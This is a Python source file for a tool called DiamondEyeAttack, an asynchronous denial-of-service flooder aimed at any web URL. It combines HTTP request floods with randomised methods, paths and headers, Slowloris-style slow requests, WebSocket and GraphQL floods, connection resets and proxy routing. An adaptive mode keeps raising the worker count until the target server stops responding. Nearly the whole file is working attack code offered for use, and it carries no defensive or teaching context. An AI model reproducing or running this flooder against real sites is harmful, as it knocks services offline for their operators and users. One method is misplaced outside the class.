# attack.py
import asyncio
import websockets
import httpx
import random
import time
from urllib.parse import urlparse
from typing import List, Dict
import psutil
import argparse
from utils import generate_headers, parse_data_size, random_string
from colorama import Fore, Style


class DiamondEyeAttack:
    def __init__(self, url: str, workers: int, sockets: int, methods: List[str],
                 useragents: List[str], no_ssl_check: bool, debug: bool, proxy: str = None,
                 use_http2: bool = False, use_http3: bool = False, websocket: bool = False,
                 auth: str = None, h2reset: bool = False, graphql_bomb: bool = False,
                 adaptive: bool = False, dns_rebind: bool = False, slow_rate: float = 0.0,
                 extreme: bool = False, data_size: int = 0, flood: bool = False, path_fuzz: bool = False,
                 header_flood: bool = False, method_fuzz: bool = False, args=None):
        self.url = url
        self.workers = workers
        self.sockets = sockets
        self.methods = [m.strip().upper() for m in methods if m.strip()] if methods else ['GET']
        self.useragents = useragents or []
        self.no_ssl_check = no_ssl_check
        self.debug = debug
        self.proxy = proxy
        self.use_http2 = use_http2
        self.use_http3 = use_http3
        self.websocket = websocket
        self.auth = auth
        self.h2reset = h2reset
        self.graphql_bomb = graphql_bomb
        self.adaptive = adaptive
        self.dns_rebind = dns_rebind
        self.slow_rate = slow_rate
        self.extreme = extreme
        self.data_size = data_size
        self.flood = flood
        self.path_fuzz = path_fuzz
        self.header_flood = header_flood
        self.method_fuzz = method_fuzz
        self.args = args if args is not None else argparse.Namespace()

        for attr in ['junk', 'header_flood', 'random_host']:
            if not hasattr(self.args, attr):
                setattr(self.args, attr, False)

        self.parsed_url = urlparse(url)
        self.host = self.parsed_url.netloc
        self.base_url = f"{self.parsed_url.scheme}://{self.parsed_url.netloc}"

        self.referers = ['http://google.com/', 'http://bing.com/', f'http://{self.host}/']
        self.paths = ['/', '/news', '/home', '/about', '/contact']
        self.fuzz_methods = ['PROPFIND', 'REPORT', 'MKCOL', 'LOCK', 'UNLOCK', 'TRACE']

        self.sent = 0
        self.failed = 0
        self.start_time = time.time()
        self.lock = asyncio.Lock()

        self.rps_history = []
        self.latency_samples = []
        self.active_tasks = set()
        self._shutdown_event = asyncio.Event()
        self._slow_writers = []
        self._monitor_task = None
        self._rps_task = None

        self.current_workers = workers
        self.adaptive_step = 0.1

    async def start(self):
        if self.adaptive:
            return await self.adaptive_attack()
        if self.websocket:
            return await self.websocket_flood()
        if self.graphql_bomb:
            return await self.send_graphql_bomb()

        print(f"{Fore.CYAN}🔧 Ramp-up: warming up...{Style.RESET_ALL}")
        await asyncio.sleep(1.0)

        if self.extreme:
            limits = httpx.Limits(max_connections=1000, max_keepalive_connections=0, keepalive_expiry=1.0)
        else:
            limits = httpx.Limits(max_connections=1000, max_keepalive_connections=20, keepalive_expiry=5.0)

        base_kwargs = {
            "verify": not self.no_ssl_check,
            "timeout": httpx.Timeout(10.0),
            "limits": limits,
        }
        if self.use_http2:
            base_kwargs["http2"] = True
        if self.use_http3:
            base_kwargs["http3"] = True
            base_kwargs["transport"] = httpx.AsyncHTTPTransport(retries=1)

        if self.proxy and not (self.use_http2 or self.use_http3):
            base_kwargs["proxies"] = {"all://": self.proxy}

        tasks = [asyncio.create_task(self.worker(base_kwargs)) for _ in range(self.workers)]
        self._monitor_task = asyncio.create_task(self.monitor())
        self._rps_task = asyncio.create_task(self.collect_rps_stats())

        try:
            await asyncio.gather(*tasks, self._monitor_task, self._rps_task, return_exceptions=True)
        except asyncio.CancelledError:
            pass

    async def worker(self, base_kwargs):
        clients = []
        try:
            for _ in range(self.sockets):
                client = httpx.AsyncClient(**base_kwargs)
                await client.__aenter__()
                clients.append(client)

            while not self._shutdown_event.is_set():
                method = self.get_random_method()
                url = self.build_random_url()

                headers = generate_headers(
                    self.host,
                    self.useragents,
                    self.referers,
                    use_junk=self.args.junk,
                    use_random_host=self.args.random_host,
                    header_flood=self.args.header_flood,
                    auth_token=self.auth
                )

                data = None
                BODY_METHODS = {'POST', 'PUT', 'PATCH', 'PROPFIND', 'REPORT', 'MKCOL', 'LOCK'}
                if method in BODY_METHODS and self.data_size > 0:
                    if method in {'PROPFIND', 'REPORT', 'LOCK', 'MKCOL'}:
                        data = '<?xml version="1.0"?><propfind xmlns="DAV:"><allprop/></propfind>'
                        if self.data_size > len(data):
                            data += 'X' * (self.data_size - len(data))
                    else:
                        if random.random() < 0.5:
                            payload_size = max(1, self.data_size - 15)
                            data = f'{{"d": "{random_string(payload_size)}"}}'
                        else:
                            data = 'X' * self.data_size

                if self.extreme:
                    temp_client = httpx.AsyncClient(**base_kwargs)
                    try:
                        await temp_client.__aenter__()
                        await self.send_request(temp_client, method, url, headers, data)
                    finally:
                        await temp_client.aclose()
                else:
                    client = random.choice(clients)
                    await self.send_request(client, method, url, headers, data)

                if self.h2reset:
                    await client.aclose()

                if random.random() < self.slow_rate:
                    task = asyncio.create_task(self.slow_request(url))
                    self.active_tasks.add(task)
                    task.add_done_callback(lambda t: self.active_tasks.discard(t))

                delay = 0.0001 if self.flood else random.uniform(0.01, 0.1)
                await asyncio.sleep(delay)

        finally:
            for client in clients:
                try:
                    await asyncio.wait_for(client.aclose(), timeout=1.0)
                except asyncio.TimeoutError:
                    pass

    def build_random_url(self) -> str:
        if self.flood and self.path_fuzz and random.random() < 0.3:
            path = random.choice(self.paths)
        else:
            path = random.choice(self.paths)

        if self.path_fuzz:
            depth = random.randint(2, 5)
            path += "/" + "/".join(random_string(8) for _ in range(depth))

        query = f"?t={random.randint(1000, 9999)}"
        full = self.base_url + path + query

        if len(full) > 512:
            path = path[:512 - len(self.base_url) - len(query) - 10]
            full = self.base_url + path + query

        return full

    async def send_request(self, client, method, url, headers, data):
        try:
            start = time.time()
            await client.request(method, url, headers=headers, content=data, follow_redirects=False)
            latency_ms = (time.time() - start) * 1000
            async with self.lock:
                self.sent += 1
                self.latency_samples.append(latency_ms)
        except Exception as e:
            async with self.lock:
                self.failed += 1
            if self.debug:
                print(f"{Fore.RED}[DEBUG] {e}{Style.RESET_ALL}")

    async def slow_request(self, url: str):
        if self._shutdown_event.is_set():
            return
        writer = None
        try:
            target = self.parsed_url.hostname
            port = 443 if self.parsed_url.scheme == 'https' else 80
            ssl = self.parsed_url.scheme == 'https'
            reader, writer = await asyncio.open_connection(target, port, ssl=ssl)
            self._slow_writers.append(writer)

            writer.write(f"GET {url} HTTP/1.1\r\nHost: {self.host}\r\n".encode())
            await writer.drain()
            await asyncio.sleep(0.5)

            headers = generate_headers(
                self.host,
                self.useragents,
                self.referers,
                use_junk=self.args.junk,
                use_random_host=self.args.random_host,
                header_flood=self.args.header_flood
            )
            for k, v in headers.items():
                if self._shutdown_event.is_set():
                    break
                writer.write(f"{k}: {v}\r\n".encode())
                try:
                    await asyncio.wait_for(writer.drain(), timeout=1.0)
                except:
                    break
                if self._shutdown_event.is_set():
                    break
                await asyncio.sleep(0.1 + random.uniform(0.0, 0.3))
        except Exception:
            pass
        finally:
            if writer:
                try:
                    writer.close()
                    await asyncio.wait_for(writer.wait_closed(), timeout=1.0)
                except Exception:
                    pass
                if writer in self._slow_writers:
                    self._slow_writers.remove(writer)

    async def monitor(self):
        try:
            while not self._shutdown_event.is_set():
                await asyncio.sleep(0.5)
                self.print_stats()
        except asyncio.CancelledError:
            self.print_stats()

    def print_stats(self):
        elapsed = time.time() - self.start_time + 1e-9
        rps = int(self.sent / elapsed)
        print(f"\r{Fore.WHITE}📬 Sent: {self.sent} | ⚠️ Failed: {self.failed} | 🚀 RPS: {rps:4d} | ⏱️ {int(elapsed)}s{Style.RESET_ALL}", end="")

    async def collect_rps_stats(self):
        last = 0
        try:
            while not self._shutdown_event.is_set():
                await asyncio.sleep(1.0)
                now = self.sent - last
                self.rps_history.append({'time': int(time.time() - self.start_time), 'rps': now})
                last = self.sent
        except asyncio.CancelledError:
            pass

    async def shutdown(self):
        if self._shutdown_event.is_set():
            return
        self._shutdown_event.set()

        if self._monitor_task:
            self._monitor_task.cancel()
        if self._rps_task:
            self._rps_task.cancel()

        for writer in self._slow_writers[:]:
            try:
                writer.close()
            except Exception:
                pass
        for writer in self._slow_writers[:]:
            try:
                await asyncio.wait_for(writer.wait_closed(), timeout=1.0)
            except Exception:
                pass
        self._slow_writers.clear()

        for task in list(self.active_tasks):
            task.cancel()
        if self.active_tasks:
            await asyncio.wait(self.active_tasks, timeout=1.0)
        self.active_tasks.clear()

        await asyncio.sleep(0.1)

    def get_random_method(self) -> str:
        if self.method_fuzz and random.random() < 0.3:
            return random.choice(self.fuzz_methods)
        return random.choice(self.methods)

    async def adaptive_attack(self):
        print(f"{Fore.CYAN}📈 Adaptive RPS: начали с {self.workers} воркеров{Style.RESET_ALL}")
        while not self._shutdown_event.is_set():
            self.current_workers = int(self.current_workers * (1 + self.adaptive_step))
            print(f"{Fore.YELLOW}🔄 Увеличиваем до {self.current_workers} воркеров{Style.RESET_ALL}")

            temp_attack = DiamondEyeAttack(
                url=self.url,
                workers=self.current_workers,
                sockets=self.sockets,
                methods=self.methods,
                useragents=self.useragents,
                no_ssl_check=self.no_ssl_check,
                debug=self.debug,
                proxy=self.proxy,
                use_http2=self.use_http2,
                use_http3=self.use_http3,
                auth=self.auth,
                h2reset=self.h2reset,
                flood=self.flood,
                path_fuzz=self.path_fuzz,
                header_flood=self.header_flood,
                args=self.args
            )
            await temp_attack.start()
            await asyncio.sleep(10)
            fail_rate = temp_attack.failed / max(1, temp_attack.sent)
            if fail_rate > 0.3:
                print(f"{Fore.RED}🛑 Сервер не отвечает. Оптимальная нагрузка достигнута.{Style.RESET_ALL}")
                break

    async def websocket_flood(self):
        print(f"{Fore.CYAN}🔗 WebSocket Flood: подключение к {self.url}...{Style.RESET_ALL}")
        ws_url = self.url.replace("http", "ws")
        tasks = []
        for _ in range(self.workers * self.sockets):
            task = asyncio.create_task(self._ws_connect(ws_url))
            tasks.append(task)
        await asyncio.gather(*tasks, return_exceptions=True)

    async def _ws_connect(self, uri):
        while not self._shutdown_event.is_set():
            try:
                async with websockets.connect(uri, ssl=(not self.no_ssl_check)) as ws:
                    while not self._shutdown_event.is_set():
                        await ws.send(random_string(64))
                        await asyncio.sleep(1)
            except (websockets.ConnectionClosed, OSError):
                pass
            except asyncio.CancelledError:
                break
            except Exception as e:
                if self.debug:
                    print(f"{Fore.RED}[WS] {e}{Style.RESET_ALL}")
            await asyncio.sleep(0.05)

async def send_graphql_bomb(self):
    print(f"{Fore.MAGENTA}💣 GraphQL Bomb: отправка 1000 запросов...{Style.RESET_ALL}")
    url = self.url.rstrip("/") + "/graphql"
    query = {"query": "{ __typename }"}

    async with httpx.AsyncClient(timeout=30) as client:
        for _ in range(1000):
            if self._shutdown_event.is_set():
                break
            try:
                await client.post(url, json=query)
                self.sent += 1
            except:
                self.failed += 1
            await asyncio.sleep(0.0001)
